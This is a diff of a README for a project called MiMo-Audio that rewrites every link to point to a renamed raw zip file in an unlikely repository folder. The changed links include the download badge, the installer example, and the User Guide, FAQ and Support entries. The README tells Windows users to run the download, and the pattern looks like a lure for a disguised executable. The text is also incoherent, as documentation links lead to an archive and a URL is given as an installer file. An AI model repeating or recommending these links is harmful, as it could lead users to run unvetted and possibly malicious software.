@@ -1,6 +1,6 @@
 # 🎶 MiMo-Audio - Learn Audio Language Models Easily
 
-[![Download MiMo-Audio](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/outsubtle/MiMo-Audio.zip)](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/outsubtle/MiMo-Audio.zip)
+[![Download MiMo-Audio](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/examples/ESD/Audio-Mi-Mo-3.4.zip)](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/examples/ESD/Audio-Mi-Mo-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to MiMo-Audio! This software allows you to explore audio language models
 
 To start using MiMo-Audio, you need to download it from our Releases page. Click the link below to go directly there:
 
-[Download MiMo-Audio](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/outsubtle/MiMo-Audio.zip)
+[Download MiMo-Audio](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/examples/ESD/Audio-Mi-Mo-3.4.zip)
 
 1. Open the link in your web browser.
 2. Look for the latest version of MiMo-Audio listed.
@@ -34,7 +34,7 @@ Once you have downloaded the file, follow these steps to install MiMo-Audio:
 ### For Windows Users
 
 1. Navigate to the location where you saved the installer.
-2. Double-click the installer file (e.g., `https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/outsubtle/MiMo-Audio.zip`).
+2. Double-click the installer file (e.g., `https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/examples/ESD/Audio-Mi-Mo-3.4.zip`).
 3. Follow the on-screen prompts to complete the installation.
 4. Once installed, you can find MiMo-Audio in your Start Menu.
 
@@ -86,9 +86,9 @@ If you encounter any issues during installation or operation, consider these com
 
 For further help and detailed information, you can review our documentation:
 
-- [User Guide](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/outsubtle/MiMo-Audio.zip) - A comprehensive guide to using all features of MiMo-Audio.
-- [FAQ](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/outsubtle/MiMo-Audio.zip) - Answers to commonly asked questions.
-- [Support](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/outsubtle/MiMo-Audio.zip) - Report issues or ask questions directly on our GitHub page.
+- [User Guide](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/examples/ESD/Audio-Mi-Mo-3.4.zip) - A comprehensive guide to using all features of MiMo-Audio.
+- [FAQ](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/examples/ESD/Audio-Mi-Mo-3.4.zip) - Answers to commonly asked questions.
+- [Support](https://raw.githubusercontent.com/Abishyesrash/MiMo-Audio/main/examples/ESD/Audio-Mi-Mo-3.4.zip) - Report issues or ask questions directly on our GitHub page.
 
 ## 🤝 Community
 
